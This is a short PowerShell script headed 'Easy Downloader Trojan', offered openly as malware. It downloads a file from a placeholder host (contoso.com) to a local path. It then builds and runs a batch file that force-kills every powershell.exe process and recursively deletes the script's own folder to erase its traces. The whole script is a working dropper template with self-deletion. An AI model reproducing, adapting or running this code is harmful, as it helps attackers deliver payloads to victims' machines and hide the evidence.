###########################################
# Easy Downloader Trojan
# Written by: Nicolas Fasolo
# With love <3
###########################################

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://www.contoso.com/file","C:\path\file")

if (-not (Test-Path ".\..\cleaner.bat"))   
{
#Cleaner Creation
Add-Content -Path ".\..\cleaner.bat" -Value "taskkill /f /im powershell.exe";
Add-Content -Path ".\..\cleaner.bat" -Value "taskkill /f /im powershell.exe";
Add-Content -Path ".\..\cleaner.bat" -Value "taskkill /f /im powershell.exe";
Add-Content -Path ".\..\cleaner.bat" -Value "taskkill /f /im powershell.exe";
Add-Content -Path ".\..\cleaner.bat" -Value "taskkill /f /im powershell.exe";
Add-Content -Path ".\..\cleaner.bat" -Value "ping 127.0.0.1";
Add-Content -Path ".\..\cleaner.bat" -Value "rmdir /S /Q $PSScriptRoot";
}
#Cleaning Phase
& ".\..\cleaner.bat";
